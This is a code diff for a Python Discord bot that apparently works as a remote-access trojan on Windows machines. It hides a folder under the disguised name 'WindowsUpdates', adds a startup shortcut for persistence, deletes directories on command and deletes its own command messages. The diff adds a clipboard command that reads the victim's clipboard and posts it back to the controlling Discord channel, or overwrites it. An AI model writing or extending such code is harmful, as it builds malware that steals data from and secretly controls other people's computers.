@@ -32,9 +32,9 @@ def list_modules():
 @client.event
 async def on_ready():
     print(f"Bot started. Version: " + "1.0.6")
-    """
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
+    """
     if os.path.exists(f"{boot_path}\Run.lnk") == False:
         target = __file__
         shell = Dispatch('WScript.Shell')
@@ -308,7 +308,6 @@ async def on_message(message):
     #DELETE DIR
     if message.content.startswith(".deletedir"):
         path = message.content.replace(".deletedir ", "")
-        print(path)
         await message.delete()
         try:
             os.rmdir(path)
@@ -373,6 +372,20 @@ async def on_message(message):
             print(e)
             embed = discord.Embed(title="Bootup", description="Failed to add persistence.", color=0x00ff00)
             return
+    
+    #CLIPBOARD
+    if message.content.startswith(".clipboard"):
+        arg = message.content.split(" ")[1]
+        await message.delete()
+        if arg == "get":
+            cb = pc.get_clipboard()
+            embed = discord.Embed(title="Clipboard", description=cb, color=0x00ff00)
+            await message.channel.send(embed=embed)
+        elif arg == "set":
+            text = message.content.replace(".clipboard set ", "")
+            pc.set_clipboard(text)
+            embed = discord.Embed(title="Clipboard", description="Clipboard set.", color=0x00ff00)
+            await message.channel.send(embed=embed)
 
 token = sys.argv[1]
 client.run(token)
